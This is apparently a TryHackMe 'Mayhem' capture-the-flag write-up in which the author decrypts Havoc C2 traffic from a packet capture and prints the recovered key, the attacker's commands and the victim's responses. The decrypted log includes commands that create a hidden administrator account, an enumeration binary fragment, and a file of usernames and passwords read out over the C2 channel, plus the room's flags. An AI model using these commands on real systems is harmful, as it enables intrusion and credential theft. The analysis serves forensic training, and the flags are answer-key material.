---
title: "TryHackme: Mayhem"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_mayhem/
image:
  path: room-img.png
description: "The Billing room on TryHackMe teaches you how to exploit a vulnerable billing system using basic web hacking techniques."
---

Created: April 22, 2025 1:50 PM
Finishing Date: April 25, 2025 → April 25, 2025
Status: Done

## **PCAP Analysis**

At first glance, we have HTTP traffic. This originates from a Python web server. The files `Install.ps1` and `notepad.exe` are being transmitted via port `1337`.

[Havoc C2 Framework – A Defensive Operator’s Guide](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide)

![679e3528170b6a90046e2c1d_66fd1941f64c03a80aa3ac1e_66be1e5500dba40c30847896_communication-structure-1024x506.webp](img2.webp)

![Screenshot From 2025-04-25 02-36-02.png](img1.png)
## this python script extract thr information for you 
you can find it in my Github 
[p.py](https://github.com/Neo-virex/Neo-virex.github.io/tree/main/images/tryhackme/tryhackme_mayhem/p.py)

```
└─$ python p.py --pcap traffic.pcapng
[+] Parsing Packets
[+] Parsing Request
[!] Error parsing request body: 'NoneType' object has no attribute 'replace'
[+] Parsing Request
[!] Error parsing request body: 'NoneType' object has no attribute 'replace'
[+] Parsing Request
[!] Error parsing request body: 'NoneType' object has no attribute 'replace'
[+] Parsing Request
[+] Found Havoc C2
  [-] Agent ID: 0e9fb7d8
  [-] Magic Bytes: deadbeef
  [-] C2 Address: http://10.0.2.37/
  [+] Found AES Key
    [-] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
  [+] Decrypting Request Body

[Decrypted Request]
1g\{콩MnsA_l3c-!G8
JY\(tA@ԥc }thu-,
                եEXS4

                     /@Zsb!q\Fd#
lOllYS▒9ȭ6\-'[~a6
#       ]#PTVS-N`ijƷ    3(eƨ.j!

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_MEM_FILE
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_MEM_FILE]
zM▒▒dt3.text 
,`a P`.data L
             @P.bssP.xdatal
                           @0@.pdata

                                    *!@0@.rdata
H                                              @P@/4@ @P@H( fHH(WSH(H1H1ft▒H
 H([_AWAVAUATUWVSHHH=L$H$H1L$I1L$ML|$8׉ÃL5LcAH-AHIAHILL|$8HMHHځ~
EA)HD9DNHIcIH|$(HIcDf u{1LIcD)AI1HHAM1HӐHH[^_]A\A]A^A_ATUWVSH@A1H-IHHD$8HD$0D$(HD$ H=LcHA1t$(HD$ IIعHD$8HD$0Յu▒MtM1E1HLH@[^_]A\AUATSH0HAHD$,IHt(LD$,HDuM1E1HLH1E1HLHP[^_A\A]ATVSH0HD$(HHtW9.HD$TLl$b1HL$aLL$LMHHHD$0HD$PHD$(Ld$ D$TPvrHD$XH$qHD$bHD$jHǄ$aHǄ$iD$LD$PD$THƸHIHL
FD$THLt$Hdt▒Hk                             YC%KH$pHǄ$`HǄ$h{`uC|$PL$`MLl$ L
t
yzHL$XHD$X1LCt
HCt           H
6CtH
$t H
LH-D9&zELL$HE11Ik_]A\A]A^A_AWAVAUATUWVSHX-D$DHƸHL
FHtI1HMkLE1HLL$8L51L|$ A֋D$Lx|$LHL|$ H1LL$8HIAAHtI1HEtHtHH
        HrBD.
t(▒H(ÐBB0p]A\A]A^A_H(
                0
                 `
p       P

r0`pP           R0

                  0R0`

0
 `
p       P
                0
                 `
p       B.,<!@!L\h

UserName                SID
====================== ====================================
%s      %s

\SIDTypeGROUP INFORMATION
%-50s%-25s%-45s%-25s
Attributes================================================= ===================== ============================================= ==================================================
%s%s%s%-50sWell-known group %-25sAlias Label Group %-45s Mandatory group, Enabled by default, Enabled group, Group owner, 
StateDescriptionPrivilege Name

%-30s%-50s%-30s
============================= ================================================= ===========================
%-30s???Enabled%-30s
DisabledGCC: (GNU) 10.3.1 20210422 (Fedora MinGW 10.3.1-2.fc34) 8?I P^ms!z"#$/P_h%
&A#V$%#$'%E(X)*+,#$#%U▒d▒w-▒.#%#%▒▒▒▒▒▒▒/▒▒0▒▒▒▒▒▒-▒.8▒J▒\▒n▒z▒#▒▒▒▒#2% $U      %i      ▒w  ▒~       ▒       %       ▒       ▒       ▒       %
                                                ▒ $(,048<@DHLPTX\`dhlptx|.filegentry.cbofstart . + bofstop 7 E! X c p go      .text
a.data▒.bss.xdata.pdata!.rdata{outputtrash4Wt5No.rdata$zzzprintoutputinternal_printfUtf16ToUtf8WhoamiGetUserWhoamiGetTokenInfoWhoamiUserWhoamiGroupsWhoamiPriv.rdata$zzzcurrentoutsize__imp_MSVCRT$calloc__imp_BeaconOutput__imp_MSVCRT$free__imp_MSVCRT$vsnprintf__imp_KERNEL32$GetProcessHeap__imp_KERNEL32$HeapAlloc__imp_KERNEL32$HeapFree__imp_Kernel32$WideCharToMultiByte__imp_SECUR32$GetUserNameExA__imp_KERNEL32$GetCurrentProcess__imp_ADVAPI32$OpenProcessToken__imp_ADVAPI32$GetTokenInformation__imp_KERNEL32$GetLastError__imp_KERNEL32$CloseHandle__imp_ADVAPI32$ConvertSidToStringSidA__imp_KERNEL32$LocalFree__imp_ADVAPI32$LookupAccountSidA__imp_MSVCRT$sprintf__imp_ADVAPI32$LookupPrivilegeNameA__imp_ADVAPI32$LookupPrivilegeDisplayNameAWd7^i&a/A=f±[ZNwU-

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]

Mz^a
    HQI
UserName                SID
====================== ====================================
CLIENTSERVER\paco       S-1-5-21-679395392-3966376528-1349639417-1103

GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
CLIENTSERVER\Domain Users                         Group                    S-1-5-21-679395392-3966376528-1349639417-513  Mandatory group, Enabled by default, Enabled group, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner, 
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
Authentication authority asserted identity        Well-known group         S-1-18-1                                      Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, 

Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      
SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
SeSecurityPrivilege           Manage auditing and security log                  Disabled                      
SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled                      
SeLoadDriverPrivilege         Load and unload device drivers                    Disabled                      
SeSystemProfilePrivilege      Profile system performance                        Disabled                      
SeSystemtimePrivilege         Change the system time                            Disabled                      
SeProfileSingleProcessPrivilegeProfile single process                            Disabled                      
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Disabled                      
SeCreatePagefilePrivilege     Create a pagefile                                 Disabled                      
SeBackupPrivilege             Back up files and directories                     Disabled                      
SeRestorePrivilege            Restore files and directories                     Disabled                      
SeShutdownPrivilege           Shut down the system                              Disabled                      
SeDebugPrivilege              Debug programs                                    Enabled                       
SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled                      
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeRemoteShutdownPrivilege     Force shutdown from a remote system               Disabled                      
SeUndockPrivilege             Remove computer from docking station              Disabled                      
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegationDisabled                      
SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled                      
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
SeCreateGlobalPrivilege       Create global objects                             Enabled                       
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
SeTimeZonePrivilege           Change the time zone                              Disabled                      
SeCreateSymbolicLinkPrivilege Create symbolic links                             Disabled                      
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionDisabled                      
a
 H

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exe▒/c ipconfig

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
)N6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z)LH
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : home
   Link-local IPv6 Address . . . . . : fe80::e134:1b0c:c8d5:3020%6
   IPv4 Address. . . . . . . . . . . : 10.0.2.38
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1
)

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exe/c systeminfo

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
N6c:\windows\system32\cmd.exep

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z

Host Name:                 WIN-9H86M71MBE9
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00431-10000-00000-AA311
Original Install Date:     11/14/2023, 7:36:09 PM
System Boot Time:          11/14/2023, 7:55:55 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3600 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     8,192 MB
Available Physical Memory: 6,352 MB
Virtual Memory: Max Size:  10,112 MB
Virtual Memory: Available: 8,376 MB
Virtual Memory: In Use:    1,736 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    clientserver.thm
Logon Server:              \\WIN-9H86M71MBE9
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5020627
                           [02]: KB5019966
                           [03]: KB5020374
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.2.3
                                 IP address(es)
                                 [01]: 10.0.2.38
                                 [02]: fe80::e134:1b0c:c8d5:3020
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exe`/c echo THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
?[N6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z?[-)THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
?[

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exeV/c net user administrato WfD3hz3AXZ4n /add

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
4^N6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z4^+'The command completed successfully.

4^

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exef/c net localgroup administrators administrato /add

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
˩PN6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z˩P+'The command completed successfully.

˩P

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exe</c dir C:\Users\paco\Desktop\

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
EN6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
ZEYU Volume in drive C has no label.
 Volume Serial Number is D284-F445

 Directory of C:\Users\paco\Desktop

11/14/2023  08:12 PM    <DIR>          .
11/14/2023  08:12 PM    <DIR>          ..
11/14/2023  08:04 PM    <DIR>          Files
               0 File(s)              0 bytes
               3 Dir(s)  94,010,191,872 bytes free
E

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exeH/c dir C:\Users\paco\Desktop\Files\

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
^N6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z^ea Volume in drive C has no label.
 Volume Serial Number is D284-F445

 Directory of C:\Users\paco\Desktop\Files

11/14/2023  08:14 PM    <DIR>          .
11/14/2023  08:14 PM    <DIR>          ..
11/14/2023  08:14 PM               555 clients.csv
               1 File(s)            555 bytes
               2 Dir(s)  94,010,060,800 bytes free
^

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_PROC
  [+] Decrypting Response Body

[Decrypted Response - COMMAND_PROC]
8c:\windows\system32\cmd.exe`/c type C:\Users\paco\Desktop\Files\clients.csv

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
N6c:\windows\system32\cmd.exe

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
  [+] Decrypting Request Body

[Decrypted Request]
Z/+username,password,email
jchristophle0,gH5#g..mL,acox0@clientserver.thm
arother1,fT4&tf>i'c%4%,efishenden1@clientserver.thm
mstitcher2,mB8#jDp*O$Tv}?,ograal2@clientserver.thm
smcbayne3,cV3&uD9w.,rdeeble3@clientserver.thm
afearby4,zO8.dugy9dq,mhartridge4@clientserver.thm
jrowley5,"mE8#uZV48nU&Mc,5",wcumes5@clientserver.thm
fbillitteri6,"kX7`\@4#+{a5,",asnalham6@clientserver.thm
jpowers7,kK2/ix%2i8U6L$A,awarrack7@clientserver.thm
cpattinson8,wX4\ZmomV78GBRa+,kstickels8@clientserver.thm
wrait9,THM{I_Can_SEE_ThE_fiL3_YoU_ToOk},fgoodall9@clientserver.thm

[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB
[+] Parsing Request
  [+] Job Request from Server to Agent
    [-] C2 Address: http://10.0.2.37/
    [-] Comamnd: COMMAND_NOJOB

```


<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
